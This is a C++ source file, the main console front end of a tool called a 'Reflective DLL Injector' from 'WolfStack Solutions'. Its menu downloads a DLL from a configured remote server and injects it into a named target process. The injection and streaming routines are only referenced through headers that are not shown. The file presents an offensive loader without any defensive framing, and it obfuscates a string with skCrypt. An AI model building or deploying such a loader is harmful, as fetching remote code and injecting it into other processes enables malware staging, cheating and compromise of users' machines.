#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <iostream>
#include <string>
#include "encrypt.h"
#include "Stream.h"
#include "inject.h"
#include "settings.h"
static HANDLE hConsole = NULL;

enum Color : WORD
{
	CLR_DEFAULT = 7,
	CLR_GREEN = 10,
	CLR_RED = 12,
	CLR_YELLOW = 14,
	CLR_CYAN = 11,
	CLR_PURPLE = 13,
	CLR_WHITE = 15
};

static void set_color(WORD color)
{
	if (hConsole) SetConsoleTextAttribute(hConsole, color);
}

static void print_colored(const char* msg, WORD color)
{
	set_color(color);
	printf("%s", msg);
	set_color(CLR_DEFAULT);
}

static void print_status(const char* label, const char* value, WORD color)
{
	set_color(CLR_CYAN);
	printf("  [");
	set_color(color);
	printf("%s", label);
	set_color(CLR_CYAN);
	printf("] ");
	set_color(CLR_DEFAULT);
	printf("%s\n", value);
}

static void print_ok(const char* msg) { print_status("+", msg, CLR_GREEN); }
static void print_err(const char* msg) { print_status("!", msg, CLR_RED); }
static void print_info(const char* msg) { print_status("*", msg, CLR_YELLOW); }

static void print_banner()
{
	set_color(CLR_PURPLE);
	printf("\n");
	printf("  ===============================================\n");
	printf("  |   Reflective DLL Injector x86   -   v2.0   |\n");
	printf("  |          WolfStack Solutions                |\n");
	printf("  ===============================================\n");
	set_color(CLR_DEFAULT);
	printf("\n");
}

static void print_menu(const std::string& ip, uint16_t port, const std::wstring& target)
{
	set_color(CLR_CYAN);
	printf("  --- Config ---\n");
	set_color(CLR_DEFAULT);
	printf("  Server:  %s:%d\n", ip.c_str(), port);
	printf("  Target:  %ls\n", target.c_str());

	if (Streaming::binary_mem)
	{
		set_color(CLR_GREEN);
		printf("  Binary:  loaded (%zu bytes)\n", Streaming::binary_size);
		set_color(CLR_DEFAULT);
	}

	printf("\n");
	set_color(CLR_CYAN);
	printf("  --- Actions ---\n");
	set_color(CLR_DEFAULT);
	printf("  [1] Download DLL from server\n");
	printf("  [2] Inject into target\n");
	printf("  [3] Download + Inject (auto)\n");
	printf("  [0] Exit\n");
	printf("\n");
	set_color(CLR_YELLOW);
	printf("  > ");
	set_color(CLR_DEFAULT);
}

static std::string read_line(const char* prompt)
{
	set_color(CLR_YELLOW);
	printf("  %s: ", prompt);
	set_color(CLR_DEFAULT);

	std::string input;
	std::getline(std::cin, input);
	return input;
}

int main(int argc, char* argv[])
{
	AllocConsole();
	FILE* f;
	freopen_s(&f, "CONOUT$", "w", stdout);
	freopen_s(&f, "CONIN$", "r", stdin);

	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTitleA(skCrypt("WolfStack Reflective Loader"));

	std::string server_ip = Settings::server_ip;
	uint16_t server_port = Settings::server_port;
	std::wstring target_process = Settings::target_process;

	print_banner();

	bool running = true;
	while (running)
	{
		print_menu(server_ip, server_port, target_process);

		std::string choice;
		std::getline(std::cin, choice);
		printf("\n");

		if (choice.empty()) continue;

		switch (choice[0])
		{
		case '1':
		{
			print_info("Connecting to server...");
			auto result = Streaming::stream_dll(server_ip.c_str(), server_port);
			if (result == Streaming::StreamResult::Success)
			{
				char buf[128];
				snprintf(buf, sizeof(buf), "DLL downloaded: %zu bytes", Streaming::binary_size);
				print_ok(buf);
			}
			else
			{
				char buf[256];
				snprintf(buf, sizeof(buf), "Download failed: %s", Streaming::result_to_string(result));
				print_err(buf);
			}
			break;
		}
		case '2':
		{
			if (!Streaming::binary_mem)
			{
				print_err("No DLL loaded - download first (option 4)");
				break;
			}
			print_info("Injecting...");
			auto result = Inject(target_process.c_str());
			if (result == InjectResult::Success)
				print_ok("Injected successfully!");
			else
			{
				char buf[256];
				snprintf(buf, sizeof(buf), "Injection failed: %s", inject_result_to_string(result));
				print_err(buf);
			}
			break;
		}
		case '3':
		{
			print_info("Connecting to server...");
			auto dl = Streaming::stream_dll(server_ip.c_str(), server_port);
			if (dl != Streaming::StreamResult::Success)
			{
				char buf[256];
				snprintf(buf, sizeof(buf), "Download failed: %s", Streaming::result_to_string(dl));
				print_err(buf);
				break;
			}
			char buf[128];
			snprintf(buf, sizeof(buf), "DLL downloaded: %zu bytes", Streaming::binary_size);
			print_ok(buf);

			print_info("Injecting...");
			auto inj = Inject(target_process.c_str());
			if (inj == InjectResult::Success)
				print_ok("Injected successfully!");
			else
			{
				char buf2[256];
				snprintf(buf2, sizeof(buf2), "Injection failed: %s", inject_result_to_string(inj));
				print_err(buf2);
			}
			break;
		}
		case '0':
			running = false;
			break;
		default:
			print_err("Invalid option");
			break;
		}
		printf("\n");
	}

	Streaming::cleanup();
	print_info("Exiting...");
	Sleep(1000);
	return 0;
}
